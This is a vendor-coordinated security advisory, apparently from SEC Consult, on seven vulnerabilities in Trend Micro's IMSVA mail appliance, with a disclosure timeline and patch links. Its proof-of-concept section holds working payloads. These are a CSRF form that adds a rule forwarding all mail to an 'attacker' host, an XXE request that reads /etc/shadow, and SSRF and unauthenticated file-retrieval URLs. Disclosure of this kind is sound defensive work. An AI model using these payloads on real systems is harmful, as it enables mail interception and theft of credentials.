@@ -1,0 +1,304 @@
+id: 35179
+date: 11/05/2020
+title: Trend Micro IMSVA CSRF / XML Injection / SSRF / File Disclosure Vulnerabilities
+author: Wolfgang Ettlinger
+cves: CVE-2020-27016, CVE-2020-27017, CVE-2020-27018, CVE-2020-27019, CVE-2020-27693, CVE-2020-27694
+
+=======================================================================
+              title: Multiple Vulnerabilities
+            product: Trend Micro InterScan Messaging Security Virtual Appliance (IMSVA)
+ vulnerable version: < 9.1.0 Critical Patch Build 2025
+      fixed version: 9.1.0 Critical Patch - Build 2025
+         CVE number: CVE-2020-27016, CVE-2020-27017, CVE-2020-27018, CVE-2020-27019
+                     CVE-2020-27693, CVE-2020-27694
+             impact: High
+           homepage: https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/interscan-messaging.html
+              found: 2020-04
+                 by: W. Ettlinger (Office Vienna)
+                     T. Serafin (Office Munich)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Europe | Asia | North America
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Trend Micro™ InterScan™ Messaging Security provides the most comprehensive
+protection against both traditional and targeted attacks. Using the correlated
+intelligence from Trend Micro™ Smart Protection Network™ and optional sandbox
+execution analysis, it blocks spam, phishing, and advanced persistent threats
+(APTs)."
+
+URL: https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/interscan-messaging.html
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult highly recommends to perform a thorough security review of this
+and similar Trend Micro products conducted by security professionals to
+identify and resolve potential further security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Cross-Site Request Forgery (CSRF
+CVE-2020-27016 (7.5 CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H)
+
+A web service accessible to authenticated administrators allows modifying the
+appliance's policy configuration. This web service can also be accessed by
+leveraging a CSRF scenario. An attacker could therefore modify policy rules
+(e.g. bypass malware checks or forward all mails to another host) by tricking
+an authenticated administrator into accessing an attacker-controlled web page.
+
+
+2) XML External Entity Processing (XXE)
+CVE-2020-27017 (7.6 CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)
+
+The web service from vulnerability #1 accepts requests in the form of XML documents.
+The XML parser used is not configured correctly, thus allowing an authenticated
+administrator to read arbitrary local files through XXE.
+
+Through an OOB XXE attack an attacker can exfiltrate local files through CSRF
+(see #1).
+
+
+3) Over-privileged Users/Services
+Sudo is configured to allow several system users access to the root account.
+An attacker gaining control over one of these accounts can access the system as
+root. Moreover, several services are executed with the privileges of the user
+root. Therefore, finding #2 allows an attacker to read files only accessible to
+root (e.g. /etc/shadow).
+
+
+4) Server Side Request Forgery (SSRF) & Local File Disclosure
+CVE-2020-27018 (2.8 CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N/E:U/RL:X/RC:X)
+
+A script accessible through the appliance's web server can be abused to request
+any URL (e.g. http(s), file). An authenticated attacker can e.g. access any
+http(s) resources or parts of some local files.
+
+
+5) Information Disclosure
+CVE-2020-27019 (4.8 CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L/E:U/RL:X/RC:X)
+
+An SQLite database as well as a cryptographic key located in the webroot can be
+accessed without authentication.
+
+Note: It is unclear what the key is used for and whether the SQLite database
+could contain sensitive information in specific configurations.
+
+
+6) Insufficient Password Storage
+CVE-2020-27693 (3.1 CVSS:3.0/AV:L/AC:L/PR:H/UI:R/S:U/C:L/I:N/A:L/E:U/RL:X/RC:X)
+
+The appliance stores passwords of administrative users as unsalted MD5 hashes
+which can be cracked easily.
+
+
+7) Outdated Software
+CVE-2020-27694 (4.6 CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:L/E:U/RL:X/RC:X)
+
+Several software components installed on the appliance are outdated. Moreover,
+the software updates provided by Trend Micro do not update the packages of the
+CentOS base system.
+
+SEC Consult did not verify whether the vulnerabilities identified through the
+version information are present or whether the vulnerabilities have an impact
+on the security of the system.
+
+
+Proof of concept:
+-----------------
+1) Cross-Site Request Forgery (CSRF) (CVE-2020-27016)
+The following request will create a rule that forwards all mails to an attacker:
+
+--- snip ---
+POST /ws_policies.imss HTTP/1.1
+Host: [...]
+Cookie: JSESSIONID=[...];
+Content-Length: 374
+
+<policies>
+ <policy
+     name="forward all traffic to attacker"
+     note="forward all traffic to attacker"
+     enable="yes"
+     version="1"
+     order="1"
+     type="other">
+  <route direction="incoming">
+   <from anyone="yes"></from>
+   <to anyone="yes"></to>
+  </route>
+  <actions>
+   <hand_off>attacker:25</hand_off>
+  </actions>
+ </policy>
+</policies>
+--- snip ---
+
+The following HTML fragment shows how this request can be sent in a CSRF
+scenario:
+
+--- snip ---
+<form action="https://[...]:8445/ws_policies.imss" method="POST"
+      enctype="text/plain">
+  <input type="hidden" name='<policies><policy name'
+      value='"forward all traffic to attacker"
+      note="forward all traffic to attacker"
+      enable="yes" version="1" order="1"  type="other">
+      <route direction="incoming"><from anyone="yes"></from>
+      <to anyone="yes"></to></route>
+      <actions><hand_off>attacker:25</hand_off></actions>
+      </policy></policies>' />
+  <input type="submit" value="Submit request" />
+</form>
+--- snip ---
+
+
+2) XML External Entity Processing (XXE) (CVE-2020-27017)
+The following request demonstrates the retrieval of /etc/shadow
+
+--- snip ---
+POST /ws_policies.imss HTTP/1.1
+Host: [...]:8445
+Cookie: JSESSIONID=[...];
+Content-Length: 290
+
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+ <!ENTITY xxe SYSTEM  "file:///etc/shadow" >]>
+<policies>
+ <policy name="test" note="test" enable="yes" version="1" order="2" type="virus">
+  <route direction="incoming">
+  <from anyone="no">
+   <group>&xxe;</group>
+  </from>
+  </route>
+ </policy>
+</policies>
+--- snip ---
+
+
+3) Over-privileged Users/Services
+The local users "admin", "enable" and all users in the group "cliusers" can execute
+commands as root (no password entry required). Note that at least for the users
+"admin" and "enable" a restricted shell is configured, thus shell access is not
+easily possible.
+
+Several network services (e.g. Tomcat, OpenLDAP, imssmgr) are executed as root.
+
+Trend Micro supplied the following additional information:
+(a) If an IMSVA user created clish users, they can only run limited commands
+    (IMSVA pre-defined commands) and all of these are one time commands
+    (not a running service in the backend)
+(b) Most of these clish commands only read logs, and does not accept any arguments,
+    so it cannot terminate or inject commands.
+(c) Few commands (such as ping) only accept few arguments (such as IP), but these
+    are well-checked. Users cannot input any arguments with other meaning, so it
+    cannot terminate or inject commands.
+
+Trend Micro decided not to include vulnerability #3 in the hardening/patch of the
+product as admin and enabled accounts are as important as root and changing the
+architecture would cause some functions not to work as expected.
+
+
+4) Server Side Request Forgery (SSRF) & Local File Disclosure (CVE-2020-27018)
+The URL demonstrates the retrieval of an HTTP URL through the appliance:
+
+https://<host>:8445/widget/proxy_controller.php?module=modSimple&userGenerated=1&serverid=1&url=http://test
+
+When accessing file:// URLs, the application sends only the content that follows
+a sequence \r\n\r\n. Therefore only parts of certain files can be retrieved.
+
+
+5) Information Disclosure (CVE-2020-27019)
+The following URL demonstrates the unauthenticated retrieval of a cryptographic
+key:
+
+https://<host>:8445/widget/repository/inc/class/common/crypt/crypt.key
+
+Moreover, an SQLite database can be retrieved.
+https://<host>:8445/widget/repository/db/sqlite/tmwf.db
+
+The contents of these files have not been further investigated.
+
+
+6) Insufficient Password Storage (CVE-2020-27693)
+The passwords for local administrators are stored in a Postgres database
+(table tb_administrator, column md5_digest). The hashes are stored as unsalted
+MD5 digests which can be cracked easily.
+
+
+7) Outdated Software (CVE-2020-27694)
+The following software versions are present in an appliance with patch level
+1993:
+* PHP 5.6.38 (PHP 5.6 is EOL)
+* Apache HTTPD 2.4.37 (see http://httpd.apache.org/security/vulnerabilities_24.html)
+* Apache Tomcat 9.0.13 (see http://tomcat.apache.org/security-9.html)
+
+The appliance is built on top of a CentOS base system. The CentOS packages
+appear not to be updated with appliance updates. In a test system, the command
+"yum check-update" yielded 203 updates to installed packages.
+
+
+Vulnerable / tested versions:
+-----------------------------
+Version 9.1.0.1960 Critical Patch 1993 has been tested and was found to be
+vulnerable. Previous versions are affected as well.
+
+
+Vendor contact timeline:
+------------------------
+2020-04-28: Contacting vendor through security@trendmicro.com
+            Submitting advisory information encrypted (PGP).
+2020-04-28: Vendor reply, they will take a look at the issue.
+2020-05-06: Vendor states that vulnerability resolution is in progress;
+            Vendor has questions regarding two vulnerabilities
+2020-05-07: Clarifying vulnerabilities
+2020-05-25: Asking for status update
+2020-05-25: Vendor: Vulnerability resolution is still in progress,
+            details follow
+2020-05-27: Vendor: A fix for 4 vulnerabilities is expected for the end of June
+2020-06-29: Asking for status update
+2020-07-01: Vendor provides prerelease update that addresses #1, #2, #4, #5, #6
+2020-07-07: Sending results of short recheck
+                #1 CSRF - fixed
+                #2 XXE - fixed
+                #4 SSRF/LFD - fixed
+                #5 InfoDisc - fixed
+                #6 Password Storage - not properly fixed yet
+2020-07-08: Vendor confirms receipt; has question regarding #3
+2020-07-10: Clarifying questions
+2020-08-04: Asking for a status update
+2020-08-04: Vendor: Issue #3 is under investigation, issue #7 in progress.
+2020-08-22: Vendor provides information that all issues have been fixed except
+            issue #3 as hardening it further would potentially break some features.
+2020-08-24: Further advisory release coordination (date, CVE numbers, patch version)
+2020-09-18: Asking for a status update; Answer: "The hotfix is ready, however, the
+            official critical patch to be used for public disclosure is still being
+            finalized"; disclosure date will be communicated later
+2020-10-23: Patch is already public since 2020-10-09, but no security bulletin yet
+            which will be coordinated
+2020-11-04: Coordinated release of security advisory
+
+
+Solution:
+---------
+The vendor provides a patch (9.1 Patch 3 - Critical Patch - Build 2025)
+which should be installed immediately. The release notes can be found here:
+https://files.trendmicro.com/documentation/readme/imsva_91_en_criticalpatch_b2025_EN_Readme.txt
+
+Patch download:
+https://downloadcenter.trendmicro.com/index.php?regs=nabu&prodid=91
+https://files.trendmicro.com/products/imsva/9.1/imsva_91_en_criticalpatch_b2025.tar.gz
+
+Trend Micro Security Bulletin:
+https://success.trendmicro.com/solution/000279833
+
+#  0day.today [2023-03-25]  #
